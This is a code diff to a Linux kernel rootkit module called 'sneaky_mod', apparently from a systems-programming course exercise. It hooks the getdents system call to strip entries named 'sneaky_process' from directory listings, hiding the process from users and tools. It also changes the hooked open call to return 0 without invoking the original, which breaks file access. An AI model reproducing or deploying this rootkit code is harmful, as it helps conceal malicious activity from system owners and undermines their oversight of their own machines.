@@ -9,7 +9,14 @@
 #include <linux/module.h>      // for all modules
 #include <linux/moduleparam.h> // *newly added for module pamameter
 #include <linux/sched.h>
-#include <string.h>
+
+// #hint struct for "getdents" system call
+struct linux_dirent {
+  u64 d_ino;               /* Inode number */
+  s64 d_off;               /* Offset to next linux_dirent */
+  unsigned short d_reclen; /* Length of this linux_dirent */
+  char d_name[];           /* Filename */
+};
 
 // Macros for kernel functions to alter Control Register 0 (CR0)
 // This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
@@ -22,14 +29,6 @@
 static long pid = 0;
 module_param(pid, long, S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP);
 MODULE_PARM_DESC(pid, "The sneaky_mod pid");
-
-// #hint struct for "getdents" system call
-struct linux_dirent {
-  u64 d_ino;               /* Inode number */
-  s64 d_off;               /* Offset to next linux_dirent */
-  unsigned short d_reclen; /* Length of this linux_dirent */
-  char d_name[];           /* Filename */
-};
 
 // These are function pointers to the system calls that change page
 // permissions for the given address (page) to read-only or read-write.
@@ -56,7 +55,7 @@ asmlinkage ssize_t (*original_read)(int fd, void *buf, size_t count);
 // Define our new sneaky version of the 'open' syscall
 asmlinkage int sneaky_sys_open(const char *pathname, int flags) {
   printk(KERN_INFO "Very, very Sneaky!\n");
-  return original_call(pathname, flags);
+  return 0;
 }
 
 /* Own version of getdents */
@@ -64,29 +63,29 @@ asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp,
                                    unsigned int count) {
   int totalbytes = original_getdents(fd, dirp, count); // get original bytes
 
-  struct linux_dirent *current = dirp; // current directory entry
+  struct linux_dirent *curt = dirp; // current directory entry
 
   int position = 0;            // current position in terms of bytes offset
   int sneaky_len = totalbytes; // sneaky version of length
 
   while (position < sneaky_len) {
     // compare if current is "sneaky_process"
-    if (strcmp(current->d_name, "sneaky_process") == 0) { // is sneaky process
-      sneaky_len = totalbytes - current->d_reclen;        // hide length
+    if (strcmp(curt->d_name, "sneaky_process") == 0) { // is sneaky process
+      sneaky_len = totalbytes - curt->d_reclen;        // hide length
 
-      char *next = (char *)current + current->d_reclen; // pointer to the next
+      char *next = (char *)curt + curt->d_reclen; // pointer to the next
 
       // completely cover current memory
       size_t startaddress = (size_t)next;
       size_t endaddress = (size_t)dirp + totalbytes;
-      memmove(current, next, endaddress - startaddress);
+      memmove(curt, next, endaddress - startaddress);
 
       continue;
     }
 
     // move to the next one
-    position += current->d_reclen;
-    current = (struct linux_dirent *)((char *)current + current->d_reclen);
+    position += curt->d_reclen;
+    curt = (struct linux_dirent *)((char *)curt + curt->d_reclen);
   }
 
   return sneaky_len;
